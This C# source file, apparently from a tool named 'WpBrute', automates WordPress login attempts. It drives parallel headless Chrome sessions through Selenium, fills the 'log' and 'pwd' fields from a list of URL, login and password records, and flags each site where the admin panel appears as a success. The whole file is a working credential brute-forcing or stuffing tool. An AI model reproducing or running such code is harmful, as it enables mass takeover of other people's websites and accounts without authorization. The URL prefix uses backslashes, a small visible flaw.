using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WpBrute.Entities;

namespace WpBrute.Services
{
    public class WordPressParser
    {
        private static int threads;
        public void run(int maxThreads, ObservableCollection<WpData> data)
        {
            threads = maxThreads;
            Thread t = new Thread(new ParameterizedThreadStart(runParallel));
            t.Start(data);
        }

        public static void runParallel(object data)
        {
            Parallel.ForEach((ObservableCollection<WpData>)data, new ParallelOptions { MaxDegreeOfParallelism = threads }, (id) => GetData(id));
        }

        public static void GetData(object obj)
        {
            var data = (WpData)obj;
            ChromeDriver chrome = new ChromeDriver();

            try
            {
                chrome.Navigate().GoToUrl("http:\\\\" + data.Url);
                try
                {
                    var login = chrome.FindElement(By.Name("log"));
                    var pwd = chrome.FindElement(By.Name("pwd"));
                    login.SendKeys(data.Login);
                    pwd.SendKeys(data.Password);
                }
                catch (Exception e)
                {
                    data.StatusCode = WpData.STATUS_NEEDS_ACTION;
                    chrome.Close();
                    chrome.Dispose();
                    return;
                }

                chrome.FindElement(By.Name("wp-submit")).Submit();

                try
                {
                    chrome.FindElement(By.ClassName("wp-admin"));
                    data.StatusCode = WpData.STATUS_SUCCESS;
                }
                catch (Exception e)
                {
                    data.StatusCode = WpData.STATUS_FAILED;
                    chrome.Close();
                    chrome.Dispose();
                    return;
                }
                chrome.Close();
                chrome.Dispose();

            }
            catch (Exception e)
            {
                chrome.Close();
                chrome.Dispose();
                data.StatusCode = WpData.STATUS_FAILED;
            }
        }
    }
}
